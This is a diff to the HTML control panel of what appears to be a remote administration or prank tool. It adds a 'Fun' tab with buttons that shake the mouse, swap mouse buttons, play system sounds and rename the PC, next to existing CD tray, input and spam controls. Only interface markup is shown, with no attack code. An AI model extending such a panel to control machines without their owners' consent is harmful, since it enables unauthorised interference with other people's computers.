@@ -207,6 +207,7 @@
                     <button class="tab" data-tab="cdtray">💿 CD Tray</button>
                     <button class="tab" data-tab="input">⌨️ Input</button>
                     <button class="tab" data-tab="spam">🔥 Spam</button>
+                    <button class="tab" data-tab="fun">🎮 Fun</button>
                 </div>
 
                 <!-- Tab Contents -->
@@ -341,6 +342,42 @@
                             <button class="btn btn-danger" onclick="startSpam()">🔥 Start Spam</button>
                             <button class="btn btn-success" onclick="stopSpam()">⏹️ Stop Spam</button>
                         </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="fun">
+                    <div class="message-box">
+                        <h3>🎮 Fun Commands</h3>
+                        
+                        <h4>🖱️ Mouse Shake</h4>
+                        <div class="control-buttons">
+                            <button class="btn btn-danger" onclick="startMouseShake()">🔥 Start Shake</button>
+                            <button class="btn btn-success" onclick="stopMouseShake()">⏹️ Stop Shake</button>
+                        </div>
+                        
+                        <br><br>
+                        <h4>🖱️ Swap Mouse Buttons</h4>
+                        <div class="control-buttons">
+                            <button class="btn btn-warning" onclick="swapMouse()">🔄 Swap Buttons</button>
+                            <button class="btn btn-info" onclick="restoreMouse()">↩️ Restore Buttons</button>
+                        </div>
+                        
+                        <br><br>
+                        <h4>🔊 System Sounds</h4>
+                        <div class="control-buttons">
+                            <button class="btn btn-danger" onclick="playSound('error')">❌ Error</button>
+                            <button class="btn btn-warning" onclick="playSound('warning')">⚠️ Warning</button>
+                            <button class="btn btn-info" onclick="playSound('info')">ℹ️ Info</button>
+                            <button class="btn btn-primary" onclick="playSound('question')">❓ Question</button>
+                        </div>
+                        
+                        <br><br>
+                        <h4>💻 Rename PC</h4>
+                        <div class="form-group">
+                            <label>New Name:</label>
+                            <input type="text" id="newPCName" placeholder="NewComputerName" maxlength="15">
+                        </div>
+                        <button class="btn btn-warning" onclick="renamePCFunc()">✏️ Rename PC (Restart Required)</button>
                     </div>
                 </div>
             </div>
